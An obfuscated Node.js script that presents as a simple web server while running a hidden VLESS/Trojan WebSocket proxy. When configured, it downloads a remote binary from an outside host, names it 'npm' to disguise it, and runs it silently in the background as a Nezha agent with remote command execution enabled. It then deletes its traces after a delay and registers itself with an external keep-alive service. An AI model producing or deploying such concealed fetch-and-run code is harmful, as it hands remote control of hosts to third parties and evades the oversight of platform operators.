const _0x5071=['toString','readUInt16BE','\x20with\x20all\x20DNS\x20servers','includes','every','https://dns.google/resolve?name=','2096','concat','test','digest','Automatic\x20Access\x20Task\x20added\x20successfully','false','NEZHA_KEY','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','2053','chmod\x20+x\x20npm','http','1234.abc.com','NEZHA_SERVER','send','end','env','child_process','Answer','UUID','then','path','buffer','&type=A','https://amd64.ssss.nyc.mn/agent','type','&fp=chrome&type=ws&host=','npm','find','setsid\x20nohup\x20./npm\x20-s\x20','url','https://arm64.ssss.nyc.mn/v1','length','reduce','client_secret:\x20','2087','post','aarch64','unlink','writeHead','write','net','sub','catch','1.1.1.1','log','WSPATH','https://amd64.ssss.nyc.mn/v1','connect','vless://','trojan://','Server\x20is\x20running\x20on\x20port\x20','Unknown','join','from','slice','map','data','text/html','readUInt8','readFile','error','text/plain','finish','https://api.ip.sb/geoip','replace','close','&path=%2F','Hello\x20world!','Not\x20Found\x0a','arm64','8443','Failed\x20to\x20resolve\x20','8.8.4.4','pipe','/bin/bash','config.yaml','get','createHash','application/json'];const _0x70f9=function(_0x507105,_0x70f9b0){_0x507105=_0x507105-0x0;let _0x2261f9=_0x5071[_0x507105];return _0x2261f9;};const os=require('os');const http=require(_0x70f9('0x10'));const fs=require('fs');const axios=require('axios');const net=require(_0x70f9('0x2e'));const path=require(_0x70f9('0x1a'));const crypto=require('crypto');const {Buffer}=require(_0x70f9('0x1b'));const {exec,execSync}=require(_0x70f9('0x16'));const {WebSocket,createWebSocketStream}=require('ws');const UUID=process['env'][_0x70f9('0x18')]||'9ab419f3-1ea2-4497-99a7-766ed0635cf1';const NEZHA_SERVER=process['env'][_0x70f9('0x12')]||'';const NEZHA_PORT=process['env']['NEZHA_PORT']||'';const NEZHA_KEY=process[_0x70f9('0x15')][_0x70f9('0xc')]||'';const DOMAIN=process[_0x70f9('0x15')]['DOMAIN']||_0x70f9('0x11');const AUTO_ACCESS=process[_0x70f9('0x15')]['AUTO_ACCESS']||![];const WSPATH=process['env'][_0x70f9('0x33')]||UUID[_0x70f9('0x3c')](0x0,0x8);const SUB_PATH=process['env']['SUB_PATH']||_0x70f9('0x2f');const NAME=process['env']['NAME']||'';const PORT=process[_0x70f9('0x15')]['PORT']||0xbb8;let ISP='';const GetISP=async()=>{try{const _0x2897c7=await axios[_0x70f9('0x52')](_0x70f9('0x45'));const _0x3a788c=_0x2897c7[_0x70f9('0x3e')];ISP=(_0x3a788c['country_code']+'-'+_0x3a788c['isp'])[_0x70f9('0x46')](/ /g,'_');}catch(_0x48c837){ISP=_0x70f9('0x39');}};GetISP();const httpServer=http['createServer']((_0x3dfc9f,_0x9d813a)=>{if(_0x3dfc9f['url']==='/'){const _0x2177c2=path['join'](__dirname,'index.html');fs[_0x70f9('0x41')](_0x2177c2,'utf8',(_0x48c897,_0x5f0f37)=>{if(_0x48c897){_0x9d813a['writeHead'](0xc8,{'Content-Type':_0x70f9('0x3f')});_0x9d813a['end'](_0x70f9('0x49'));return;}_0x9d813a['writeHead'](0xc8,{'Content-Type':_0x70f9('0x3f')});_0x9d813a['end'](_0x5f0f37);});return;}else if(_0x3dfc9f['url']==='/'+SUB_PATH){const _0x6e6d2a=NAME?NAME+'-'+ISP:ISP;const _0x5bfd36=_0x70f9('0x36')+UUID+'@cdns.doon.eu.org:443?encryption=none&security=tls&sni='+DOMAIN+_0x70f9('0x1f')+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x6e6d2a;const _0x5702c6=_0x70f9('0x37')+UUID+'@cdns.doon.eu.org:443?security=tls&sni='+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x70f9('0x48')+WSPATH+'#'+_0x6e6d2a;const _0x4974cc=_0x5bfd36+'\x0a'+_0x5702c6;const _0x539b74=Buffer[_0x70f9('0x3b')](_0x4974cc)[_0x70f9('0x0')]('base64');_0x9d813a['writeHead'](0xc8,{'Content-Type':'text/plain'});_0x9d813a[_0x70f9('0x14')](_0x539b74+'\x0a');}else{_0x9d813a[_0x70f9('0x2c')](0x194,{'Content-Type':_0x70f9('0x43')});_0x9d813a['end'](_0x70f9('0x4a'));}});const wss=new WebSocket['Server']({'server':httpServer});const uuid=UUID['replace'](/-/g,'');const DNS_SERVERS=[_0x70f9('0x4e'),_0x70f9('0x31')];function resolveHost(_0x3cc362){return new Promise((_0x443d3,_0x286b6d)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x70f9('0x8')](_0x3cc362)){_0x443d3(_0x3cc362);return;}let _0x2b4bef=0x0;function _0x1050b4(){if(_0x2b4bef>=DNS_SERVERS[_0x70f9('0x25')]){_0x286b6d(new Error(_0x70f9('0x4d')+_0x3cc362+_0x70f9('0x2')));return;}const _0x58841e=DNS_SERVERS[_0x2b4bef];_0x2b4bef++;const _0x1f56cf=_0x70f9('0x5')+encodeURIComponent(_0x3cc362)+_0x70f9('0x1c');axios[_0x70f9('0x52')](_0x1f56cf,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})['then'](_0x1e3b6e=>{const _0x4e9f5b=_0x1e3b6e[_0x70f9('0x3e')];if(_0x4e9f5b['Status']===0x0&&_0x4e9f5b['Answer']&&_0x4e9f5b[_0x70f9('0x17')][_0x70f9('0x25')]>0x0){const _0x170dfa=_0x4e9f5b['Answer'][_0x70f9('0x21')](_0x533955=>_0x533955[_0x70f9('0x1e')]===0x1);if(_0x170dfa){_0x443d3(_0x170dfa['data']);return;}}_0x1050b4();})['catch'](_0x207258=>{_0x1050b4();});}_0x1050b4();});}function handleVlessConnection(_0x58cc3b,_0xc84d9b){const [_0x13c736]=_0xc84d9b;const _0x14fbe8=_0xc84d9b['slice'](0x1,0x11);if(!_0x14fbe8[_0x70f9('0x4')]((_0x16b790,_0x10bd92)=>_0x16b790==parseInt(uuid['substr'](_0x10bd92*0x2,0x2),0x10)))return![];let _0x10cf72=_0xc84d9b[_0x70f9('0x3c')](0x11,0x12)['readUInt8']()+0x13;const _0x57d763=_0xc84d9b['slice'](_0x10cf72,_0x10cf72+=0x2)['readUInt16BE'](0x0);const _0x5bd439=_0xc84d9b['slice'](_0x10cf72,_0x10cf72+=0x1)['readUInt8']();const _0x100128=_0x5bd439==0x1?_0xc84d9b[_0x70f9('0x3c')](_0x10cf72,_0x10cf72+=0x4)[_0x70f9('0x3a')]('.'):_0x5bd439==0x2?new TextDecoder()['decode'](_0xc84d9b['slice'](_0x10cf72+0x1,_0x10cf72+=0x1+_0xc84d9b['slice'](_0x10cf72,_0x10cf72+0x1)[_0x70f9('0x40')]())):_0x5bd439==0x3?_0xc84d9b['slice'](_0x10cf72,_0x10cf72+=0x10)['reduce']((_0x3b1504,_0x5c92c2,_0x54ec3e,_0x22790c)=>_0x54ec3e%0x2?_0x3b1504[_0x70f9('0x7')](_0x22790c[_0x70f9('0x3c')](_0x54ec3e-0x1,_0x54ec3e+0x1)):_0x3b1504,[])['map'](_0x1b76a8=>_0x1b76a8[_0x70f9('0x1')](0x0)['toString'](0x10))[_0x70f9('0x3a')](':'):'';_0x58cc3b[_0x70f9('0x13')](new Uint8Array([_0x13c736,0x0]));const _0x375307=createWebSocketStream(_0x58cc3b);resolveHost(_0x100128)['then'](_0x205dbd=>{net[_0x70f9('0x35')]({'host':_0x205dbd,'port':_0x57d763},function(){this[_0x70f9('0x2d')](_0xc84d9b[_0x70f9('0x3c')](_0x10cf72));_0x375307['on'](_0x70f9('0x42'),()=>{})[_0x70f9('0x4f')](this)['on']('error',()=>{})['pipe'](_0x375307);})['on'](_0x70f9('0x42'),()=>{});})[_0x70f9('0x30')](_0x2925a7=>{net['connect']({'host':_0x100128,'port':_0x57d763},function(){this[_0x70f9('0x2d')](_0xc84d9b[_0x70f9('0x3c')](_0x10cf72));_0x375307['on']('error',()=>{})['pipe'](this)['on'](_0x70f9('0x42'),()=>{})[_0x70f9('0x4f')](_0x375307);})['on'](_0x70f9('0x42'),()=>{});});return!![];}function handleTrojanConnection(_0x5e1f84,_0x118bc9){try{if(_0x118bc9['length']<0x3a)return![];const _0x4aa665=_0x118bc9['slice'](0x0,0x38)[_0x70f9('0x0')]();const _0x9c0294=[UUID];let _0x2935c5=null;for(const _0x50e5b8 of _0x9c0294){const _0x4e53f1=crypto[_0x70f9('0x53')]('sha224')['update'](_0x50e5b8)[_0x70f9('0x9')]('hex');if(_0x4e53f1===_0x4aa665){_0x2935c5=_0x50e5b8;break;}}if(!_0x2935c5)return![];let _0x2c94f4=0x38;if(_0x118bc9[_0x2c94f4]===0xd&&_0x118bc9[_0x2c94f4+0x1]===0xa){_0x2c94f4+=0x2;}const _0x1cee78=_0x118bc9[_0x2c94f4];if(_0x1cee78!==0x1)return![];_0x2c94f4+=0x1;const _0x3952ec=_0x118bc9[_0x2c94f4];_0x2c94f4+=0x1;let _0x42987f,_0x2ad835;if(_0x3952ec===0x1){_0x42987f=_0x118bc9['slice'](_0x2c94f4,_0x2c94f4+0x4)['join']('.');_0x2c94f4+=0x4;}else if(_0x3952ec===0x3){const _0x31f807=_0x118bc9[_0x2c94f4];_0x2c94f4+=0x1;_0x42987f=_0x118bc9['slice'](_0x2c94f4,_0x2c94f4+_0x31f807)['toString']();_0x2c94f4+=_0x31f807;}else if(_0x3952ec===0x4){_0x42987f=_0x118bc9[_0x70f9('0x3c')](_0x2c94f4,_0x2c94f4+0x10)[_0x70f9('0x26')]((_0x324657,_0x5a2f3e,_0x566a1f,_0x487d3e)=>_0x566a1f%0x2?_0x324657['concat'](_0x487d3e['slice'](_0x566a1f-0x1,_0x566a1f+0x1)):_0x324657,[])[_0x70f9('0x3d')](_0x17c617=>_0x17c617[_0x70f9('0x1')](0x0)['toString'](0x10))['join'](':');_0x2c94f4+=0x10;}else{return![];}_0x2ad835=_0x118bc9[_0x70f9('0x1')](_0x2c94f4);_0x2c94f4+=0x2;if(_0x2c94f4<_0x118bc9['length']&&_0x118bc9[_0x2c94f4]===0xd&&_0x118bc9[_0x2c94f4+0x1]===0xa){_0x2c94f4+=0x2;}const _0x19156c=createWebSocketStream(_0x5e1f84);resolveHost(_0x42987f)[_0x70f9('0x19')](_0xed2c3a=>{net[_0x70f9('0x35')]({'host':_0xed2c3a,'port':_0x2ad835},function(){if(_0x2c94f4<_0x118bc9['length']){this['write'](_0x118bc9[_0x70f9('0x3c')](_0x2c94f4));}_0x19156c['on']('error',()=>{})['pipe'](this)['on']('error',()=>{})['pipe'](_0x19156c);})['on'](_0x70f9('0x42'),()=>{});})['catch'](_0x337292=>{net['connect']({'host':_0x42987f,'port':_0x2ad835},function(){if(_0x2c94f4<_0x118bc9['length']){this[_0x70f9('0x2d')](_0x118bc9['slice'](_0x2c94f4));}_0x19156c['on']('error',()=>{})['pipe'](this)['on'](_0x70f9('0x42'),()=>{})['pipe'](_0x19156c);})['on'](_0x70f9('0x42'),()=>{});});return!![];}catch(_0x25151f){return![];}}wss['on']('connection',(_0x8223af,_0x8cd70e)=>{const _0x56f48c=_0x8cd70e[_0x70f9('0x23')]||'';_0x8223af['once']('message',_0x508ae0=>{if(_0x508ae0['length']>0x11&&_0x508ae0[0x0]===0x0){const _0x113d70=_0x508ae0[_0x70f9('0x3c')](0x1,0x11);const _0x66d439=_0x113d70['every']((_0x1f4021,_0x1e2fde)=>_0x1f4021==parseInt(uuid['substr'](_0x1e2fde*0x2,0x2),0x10));if(_0x66d439){if(!handleVlessConnection(_0x8223af,_0x508ae0)){_0x8223af[_0x70f9('0x47')]();}return;}}if(!handleTrojanConnection(_0x8223af,_0x508ae0)){_0x8223af['close']();}})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x5edb29=os['arch']();if(_0x5edb29==='arm'||_0x5edb29===_0x70f9('0x4b')||_0x5edb29===_0x70f9('0x2a')){if(!NEZHA_PORT){return _0x70f9('0x24');}else{return'https://arm64.ssss.nyc.mn/agent';}}else{if(!NEZHA_PORT){return _0x70f9('0x34');}else{return _0x70f9('0x1d');}}};const downloadFile=async()=>{if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x4f1fce=getDownloadUrl();const _0xeef5c6=await axios({'method':'get','url':_0x4f1fce,'responseType':'stream'});const _0x2decab=fs['createWriteStream']('npm');_0xeef5c6[_0x70f9('0x3e')][_0x70f9('0x4f')](_0x2decab);return new Promise((_0x11346c,_0x53c64d)=>{_0x2decab['on'](_0x70f9('0x44'),()=>{console['log']('npm\x20download\x20successfully');exec(_0x70f9('0xf'),_0x1219b1=>{if(_0x1219b1)_0x53c64d(_0x1219b1);_0x11346c();});});_0x2decab['on']('error',_0x53c64d);});}catch(_0x2b3091){throw _0x2b3091;}};const runnz=async()=>{try{const _0x296827=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':'utf-8'});if(_0x296827['trim']()!==''){console[_0x70f9('0x32')]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x2bebce){}await downloadFile();let _0x375768='';let _0x5c6e5a=['443',_0x70f9('0x4c'),_0x70f9('0x6'),_0x70f9('0x28'),'2083',_0x70f9('0xe')];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x8afab5=_0x5c6e5a['includes'](NEZHA_PORT)?'--tls':'';_0x375768=_0x70f9('0x22')+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x8afab5+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x47427d=NEZHA_SERVER[_0x70f9('0x3')](':')?NEZHA_SERVER['split'](':')['pop']():'';const _0x57794b=_0x5c6e5a['includes'](_0x47427d)?'true':_0x70f9('0xb');const _0x377843=_0x70f9('0x27')+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x57794b+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync']('config.yaml',_0x377843);}_0x375768=_0x70f9('0xd');}else{console[_0x70f9('0x32')]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}try{exec(_0x375768,{'shell':_0x70f9('0x50')},_0x1b1c09=>{if(_0x1b1c09)console[_0x70f9('0x42')]('npm\x20running\x20error:',_0x1b1c09);else console[_0x70f9('0x32')]('npm\x20is\x20running');});}catch(_0x58b1b6){console['error']('error:\x20'+_0x58b1b6);}};async function addAccessTask(){if(!AUTO_ACCESS)return;if(!DOMAIN){return;}const _0x1f9d53='https://'+DOMAIN+'/'+SUB_PATH;try{const _0x3e4a64=await axios[_0x70f9('0x29')]('https://oooo.serv00.net/add-url',{'url':_0x1f9d53},{'headers':{'Content-Type':_0x70f9('0x54')}});console[_0x70f9('0x32')](_0x70f9('0xa'));}catch(_0x4028d9){}}const delFiles=()=>{fs[_0x70f9('0x2b')](_0x70f9('0x20'),()=>{});fs['unlink'](_0x70f9('0x51'),()=>{});};httpServer['listen'](PORT,()=>{runnz();setTimeout(()=>{delFiles();},0x2bf20);addAccessTask();console[_0x70f9('0x32')](_0x70f9('0x38')+PORT);});
